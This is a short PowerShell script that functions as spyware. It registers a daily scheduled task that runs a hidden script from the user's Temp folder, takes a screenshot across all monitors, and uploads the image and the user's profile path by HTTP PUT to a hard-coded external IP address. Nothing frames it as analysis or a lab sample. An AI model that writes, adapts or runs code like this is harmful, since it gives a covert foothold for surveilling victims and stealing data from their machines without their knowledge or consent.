if((-not ((Get-ScheduledTask | Where TaskName -eq denemetask )))){
    
    schtasks.exe /create /tn denemetask /sc daily /tr "powershell -WindowStyle Hidden  $env:USERPROFILE\AppData\Local\Temp\mallquest.ps1" /st 13:54
}


#set-executionpolicy remotesigned
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$screens = [Windows.Forms.Screen]::AllScreens

$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)

$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

$bmp.Save("$env:USERPROFILE\AppData\Local\Temp\test.png")

$graphics.Dispose()
$bmp.Dispose()


$uri = '206.189.99.99:8000'
$body=Get-Content -Path "$env:USERPROFILE\AppData\Local\Temp\test.png"
$body2=$env:USERPROFILE
# RESTful API Call
Invoke-WebRequest -Uri '206.189.99.99:8000' -Method Put -Body $body
Invoke-WebRequest -Uri '206.189.99.99:8000' -Method Put -Body $body2

